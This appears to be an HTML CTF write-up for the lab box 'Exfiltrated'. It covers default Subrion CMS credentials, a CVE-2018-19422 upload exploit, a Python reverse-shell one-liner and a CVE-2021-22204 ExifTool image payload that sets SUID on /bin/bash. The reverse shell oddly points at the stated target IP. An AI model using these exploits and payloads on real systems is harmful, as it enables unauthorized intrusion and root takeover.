@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Exfiltrated &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Exfiltrated</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">SubrionCMS</span><span class="tag">CVE</span><span class="tag">FileUpload</span><span class="tag">RCE</span><span class="tag">cron</span><span class="tag">ExifTool</span><span class="tag">SUIDBinary</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#default-credentials-on-subrion">Default Credentials on Subrion</a><a class="lvl3" href="#authenticated-file-upload-rce-cve-2018-19422">Authenticated File Upload RCE (CVE-2018-19422)</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#root-cron-job-running-exiftool">Root Cron Job Running ExifTool</a><a class="lvl3" href="#cve-2021-22204-malicious-image-to-suid-bin-bash">CVE-2021-22204, Malicious Image to SUID /bin/bash</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Exfiltrated is a Linux box running Subrion CMS 4.2.1 behind an <code>exfiltrated.offsec</code> virtual host. The CMS admin panel accepts default credentials, and a public exploit (CVE-2018-19422) abuses the authenticated file upload to gain a shell as <code>www-data</code>. Privilege escalation comes through a root-owned cron job that runs <code>exiftool</code> against uploaded JPEGs every minute. ExifTool at the installed version is vulnerable to CVE-2021-22204, which executes embedded payload code during metadata parsing, used here to set the SUID bit on <code>/bin/bash</code> and become root.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 7 disallowed entries
+| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/
+|_http-title: Did not follow redirect to http://exfiltrated.offsec/
+</code></pre>
+<p>Nmap's <code>robots.txt</code> parsing hands over the site structure immediately. <code>/panel/</code> is the admin interface.</p>
+<p>After adding <code>exfiltrated.offsec</code> to <code>/etc/hosts</code>, the site loads a Subrion CMS instance. Visiting <code>/panel</code> shows:</p>
+<pre><code>Powered by Subrion CMS v4.2.1
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="default-credentials-on-subrion">Default Credentials on Subrion</h3>
+<p>The admin panel at <code>/panel</code> accepts <code>admin:admin</code> on the first try.</p>
+<blockquote>
+<p><strong>Why default credentials on CMSes matter:</strong> appliance-style CMSes ship with documented defaults so the first setup isn't locked out. Subrion's documentation lists <code>admin:admin</code> as the initial credential. Admins who skip the "change your password" step during setup leave the panel perpetually open. It costs one request to check and is always worth doing before reaching for exploits.</p>
+</blockquote>
+<h3 id="authenticated-file-upload-rce-cve-2018-19422">Authenticated File Upload RCE (CVE-2018-19422)</h3>
+<p>Subrion 4.2.1 allows uploading <code>.phar</code> files through the panel, which Apache executes as PHP. A public exploit automates the process:</p>
+<pre><code class="language-sh">python3 49876.py --user admin --passw admin -u http://exfiltrated.offsec/panel/
+[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422
+[+] Trying to connect to: http://exfiltrated.offsec/panel/
+[+] Success!
+[+] Got CSRF token: W6FiEazfokseAdzEtvtZmjtDogEXo0yVid2khyuL
+[+] Trying to log in...
+[+] Login Successful!
+[+] Generating random name for Webshell...
+[+] Generated webshell name: owfsvlcajygdbpc
+[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/owfsvlcajygdbpc.phar
+
+$ whoami
+www-data
+</code></pre>
+<p>A full reverse shell required the Python socket method:</p>
+<pre><code class="language-sh">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.45.244&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)'
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="root-cron-job-running-exiftool">Root Cron Job Running ExifTool</h3>
+<p>LinPEAS surfaces a cron job running every minute as root:</p>
+<pre><code class="language-sh">* * * * *   root    bash /opt/image-exif.sh
+</code></pre>
+<p>Contents of <code>/opt/image-exif.sh</code>:</p>
+<pre><code class="language-sh">#!/bin/bash
+IMAGES='/var/www/html/subrion/uploads'
+META='/opt/metadata'
+FILE=`openssl rand -hex 5`
+LOGFILE=&quot;$META/$FILE&quot;
+
+ls $IMAGES | grep &quot;jpg&quot; | while read filename;
+do
+    exiftool &quot;$IMAGES/$filename&quot; &gt;&gt; $LOGFILE
+done
+</code></pre>
+<p>Every minute, root runs <code>exiftool</code> against any <code>.jpg</code> in the Subrion uploads directory, the same directory where authenticated users can upload files.</p>
+<blockquote>
+<p><strong>Why this creates a privesc path:</strong> CVE-2021-22204 lets an attacker embed a shell command inside a specially crafted image file. When ExifTool processes that image, it evaluates the embedded payload as code. Since the cron job runs <code>exiftool</code> as root, the payload executes with root privileges. The attacker needs only the ability to write a <code>.jpg</code> to the uploads directory, which the Subrion web shell already provides.</p>
+</blockquote>
+<h3 id="cve-2021-22204-malicious-image-to-suid-bin-bash">CVE-2021-22204, Malicious Image to SUID /bin/bash</h3>
+<p>Generate an exploit image that sets the SUID bit on <code>/bin/bash</code>:</p>
+<pre><code class="language-sh">python3 exploit-CVE-2021-22204.py -c &quot;chmod +s /bin/bash&quot;
+
+PAYLOAD: (metadata &quot;\c${system('chmod +s /bin/bash')};&quot;)
+SUCCESS: Exploit image written to &quot;image.jpg&quot;
+</code></pre>
+<p>Upload <code>image.jpg</code> to <code>/var/www/html/subrion/uploads/</code> via the web shell. Within one minute, the cron job fires, ExifTool processes the image, and <code>/bin/bash</code> becomes SUID.</p>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">www-data@exfiltrated:/bin$ /bin/bash -p
+bash-5.0# whoami
+root
+</code></pre>
+<pre><code class="language-sh">bash-5.0# cat local.txt
+‹redacted›
+
+bash-5.0# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong><code>robots.txt</code> disallowed entries map the CMS structure.</strong> Nmap parsed it automatically; the <code>/panel/</code> path was handed over without any brute force.</li>
+<li><strong>Default CMS credentials compound the upload vulnerability.</strong> Authentication is supposed to gate CVE-2018-19422, but when admin:admin works, authentication provides no protection at all.</li>
+<li><strong>Cron jobs that process user-controlled files are root code execution sinks.</strong> Any root process that reads attacker-writable files is a privesc path. The combination of CVE-2021-22204 and a cron/exiftool pattern appears on multiple PG and OSCP boxes.</li>
+<li><strong>SUID on /bin/bash is an instant root.</strong> <code>bash -p</code> runs in privileged mode, inheriting the SUID owner's UID without spawning a new process.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
